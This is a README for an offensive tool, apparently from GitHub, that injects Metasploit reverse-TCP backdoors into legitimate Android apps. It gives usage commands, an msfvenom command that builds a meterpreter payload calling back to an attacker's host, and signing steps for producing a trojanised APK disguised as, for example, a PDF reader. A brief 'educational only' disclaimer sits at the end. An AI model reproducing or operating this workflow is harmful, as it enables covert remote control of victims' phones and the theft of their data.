# apk_dark / DURK ANK
Metasploit Payload Binder for Android APKs

📱 A powerful CLI tool for injecting Metasploit reverse TCP payloads into trusted Android APKs.

## 🔥 Features

- Decompiles both the original (decoy) APK and the backdoor payload
- Injects payload smali code into the target's launcher activity
- Modifies `AndroidManifest.xml` to register services and receivers
- Rebuilds, signs, and aligns the final malicious APK
- Fully automatable and written in Python

## 🛠 Requirements

- Linux / WSL / macOS
- `apktool` v2.9+
- `apksigner`
- `zipalign`
- Java (JDK 8+)
- Python 3.8+

Install dependencies:

```bash
sudo apt install apktool apksigner zipalign openjdk-17-jdk python3-pip
pip install -r requirements.txt
```

## ⚙️ Usage

```bash
./apk_dark.py <decoy_apk> <payload_apk> <output_apk> <keystore.jks> <alias> <keystore_password>
```

**Example:**

```bash
./apk_dark.py Downloads/pdf_reader.apk Downloads/backdoor.apk Downloads/output.apk ~/darkapk-release.jks darkkey android
```

### 📌 Arguments

- `decoy_apk` — The clean/trusted APK (like a PDF viewer)
- `payload_apk` — The backdoor APK (generated using msfvenom)
- `output_apk` — Final rebuilt and signed malicious APK
- `keystore.jks` — Java keystore file path for signing
- `alias` — Keystore alias
- `password` — Keystore password

## 📦 Generate Metasploit Payload APK

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -o backdoor.apk
```

## 🔐 Generate a Keystore

```bash
keytool -genkey -v -keystore darkapk-release.jks -keyalg RSA -keysize 2048 -validity 10000 -alias darkkey
```

## 🧪 Output Example

```
[*] Injecting payload...
[*] Modifying AndroidManifest.xml
[*] Rebuilding APK...
[*] Signing APK...
[✔] Final APK: output.apk
```

## ❗ Disclaimer

This tool is intended for **educational and research purposes only**.  
Do not use it without proper authorization. The author assumes no responsibility for misuse.

---

## 🡩‍💼 Author

Made with ☠️ by [Vector](https://github.com/Vectorindia1)

---

Feel free to replace the content or let me know if you'd like this added directly into your project! 🚀

